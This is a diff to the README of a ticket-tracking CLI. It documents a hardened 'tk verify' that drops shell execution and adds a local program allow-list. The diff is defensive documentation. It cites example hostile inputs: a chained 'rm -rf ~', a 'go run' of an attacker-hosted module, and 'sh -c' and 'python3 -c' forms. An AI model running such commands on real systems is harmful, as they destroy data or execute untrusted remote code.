@@ -83,12 +83,17 @@ git_email: tk@local
 git_name: tk
 default_store: central
 sync_interval: 5s
+verify_allow:
+    - go
+    - make
 projects:
     myproject:
         path: /Users/you/code/myproject
 ```
 
 Shared project registry (store type, auto_link, etc.) is stored in `<central_root>/config.yaml` and synced via git alongside tickets.
+
+`verify_allow` lists the programs `tk verify` may run — see [Verifiable Acceptance Criteria](#verifiable-acceptance-criteria). It is read from this local file only; a `verify_allow` in the shared config is ignored.
 
 `--repo` flag overrides project resolution for a single command.
 
@@ -248,7 +253,7 @@ Neither class is confined to the migration, so the report does not empty out: ev
 
 ### Verifiable Acceptance Criteria
 
-Acceptance criteria live in the ticket's `## Acceptance Criteria` section as bullets. A criterion can declare the shell command that checks it on a following line indented by at least two spaces:
+Acceptance criteria live in the ticket's `## Acceptance Criteria` section as bullets. A criterion can declare the command that checks it on a following line indented by at least two spaces:
 
 ```markdown
 ## Acceptance Criteria
@@ -258,25 +263,61 @@ Acceptance criteria live in the ticket's `## Acceptance Criteria` section as bul
 - Docs updated.
 ```
 
-`tk verify <id>` runs each declared command with `sh -c` in the ticket's project directory (from the project's configured `path`, falling back to the working directory), sequentially, with a 120s timeout per command — a command that overruns is a failure. Criteria with no `verify:` line are reported as `unverified`, not failed.
+`tk verify <id>` runs each declared command in the ticket's project directory (from the project's configured `path`, falling back to the working directory), sequentially, with a 120s timeout per command — a command that overruns is a failure. Criteria with no `verify:` line are reported as `unverified`, not failed.
 
 ```bash
 tk verify 5c4
 # verifying nw-5c46 in /Users/you/code/myproject
 # PASS (exit 0) Frontier excludes blocked tickets.
 # UNVERIFIED Docs updated.
-# 1 pass, 0 fail, 1 unverified
+# 1 pass, 0 fail, 0 refused, 1 unverified
 ```
 
-The command exits non-zero if any criterion failed, and records the run in the ticket's `## Test Results` section (replacing the previous record):
+The command exits non-zero if any criterion failed or was refused, and records the run in the ticket's `## Test Results` section (replacing the previous record):
 
 ```
-verify 2026-07-31T22:10:00Z: 1 pass, 0 fail, 1 unverified
+verify 2026-07-31T22:10:00Z: 1 pass, 0 fail, 0 refused, 1 unverified
 - PASS (exit 0): Frontier excludes blocked tickets.
 - UNVERIFIED: Docs updated.
 ```
 
 `tk verify --json` and the `ticket_verify` MCP tool return the same results structured, including each command's exit code and captured output (capped at 4KB per criterion). The MCP tool executes the commands on the server host and requires the ticket's project to have a configured path.
+
+#### What may run
+
+A verify command is content: agents write ticket bodies, and bodies replicate to every machine over the shared store's git remote. Two rules keep that content from becoming code execution.
+
+**No shell.** The command is split into arguments on whitespace — single and double quotes group an argument, so `-run 'TestA|TestB'` survives whole — and then exec'd directly. Nothing is expanded and nothing is interpreted: `;`, `|`, `&&`, `$(...)`, backticks, `*` and `~` are literal characters handed to the program as part of an argument. `go test ./...; rm -rf ~` runs `go` with the arguments `test`, `./...;`, `rm`, `-rf`, `~` — `go` rejects the nonsense arguments, and nothing is deleted.
+
+**Allow-list.** The program — the first word — must exactly match an entry in `verify_allow` in your machine-local `~/.ticket/config.yaml`. Matching is exact string equality, not by basename, so an entry of `go` does not admit `/tmp/evil/go`. Anything else is `refused`: it never runs, and the refusal names the command and how to permit it.
+
+An entry names a lookup, not a fixed file: a bare `go` resolves through tk's `PATH` when the command is exec'd, and a relative entry such as `./scripts/check.sh` resolves against the project directory the command runs in — the same working tree your agents write to. Use an absolute path to pin a specific binary.
+
+```yaml
+# ~/.ticket/config.yaml
+verify_allow:
+  - go
+  - make
+  - ./scripts/check.sh
+```
+
+Unset, the list defaults to `go`, `make`, `cargo`, `pytest`. An explicitly empty `verify_allow: []` refuses everything, and so does a `~/.ticket/config.yaml` that cannot be parsed — a half-written or conflicted config never restores the defaults over a list you had narrowed.
+
+**What listing a program actually grants.** An entry is not a claim that the program is safe. It trusts whoever can write a verify line with everything that program can do, including the forms that run code from outside your repo:
+
+- `go run example.com/attacker/x@latest` and `go install pkg@version` fetch and execute a remote module, ignoring the checked-out repo entirely.
+- `cargo install <crate>` fetches a remote crate and executes its `build.rs` at build time — the direct analogue of `go install`.
+- `make -f /path/to/anything` and `make -C <dir>` run recipes from a file the command line names rather than the repo's Makefile.
+
+They are in the default, because `go test` is the point of the feature and cannot be dropped over them. What the default buys you is that a verify line cannot name an arbitrary program — not that the listed ones are confined to the repo. Shells and interpreters are left out because they remove even that while buying nothing back: `sh -c '<anything>'` or `python3 -c '<anything>'` runs whatever string the ticket supplied.
+
+`swift` is left out on that rule, not as a build driver: `swift -e '<code>'` runs arbitrary Swift with the full standard library, the same unconditional reach that keeps `sh` and `python3` out — and unlike `go run pkg@version` it needs no remote module and no network. A Swift project gets `swift test` back by adding `swift` to `verify_allow`, accepting that a verify line can then run any Swift the ticket names.
+
+`npm`, `pnpm` and `yarn` are left out for the same reason — `npm exec <pkg>`, `pnpm dlx` and `yarn dlx` fetch and run an arbitrary package off the registry as a documented feature. A JS project that adds one back is opting into a verify line being able to run any published package, which may well be an acceptable trade in a repo whose `npm test` already runs whatever `package.json` says. Add it deliberately, not by default.
+
+The list is read from `~/.ticket/config.yaml` alone. `verify_allow` in the shared `<central_root>/config.yaml` is ignored, because that file syncs over the same remote that would carry a hostile command — one push would otherwise plant the command and widen the list that should refuse it. There is no flag, no MCP argument and no ticket field that grants permission: **an agent can run what you have already allowed, and can authorize nothing further.** Only you, editing your own machine's config file, widen the list.
+
+A refusal is reported as `refused`, never as a failure, and counted separately in the summary and the recorded results — a criterion that never ran is not a criterion that disagreed. Control characters — C0/C1, DEL and the Unicode format characters, including the bidi overrides — are stripped from both the criterion text and the command before they are printed or recorded, so an escape planted anywhere in a ticket's acceptance criteria cannot repaint the terminal you are reading the verdict on, nor replay on every later `tk show`. Tabs survive, being ordinary in a markdown bullet and harmless on a terminal. The stripping covers the criterion text and its command, and not a command's own output: that is printed as the program emitted it, so coloured test output stays readable.
 
 ### Filter Flags
 
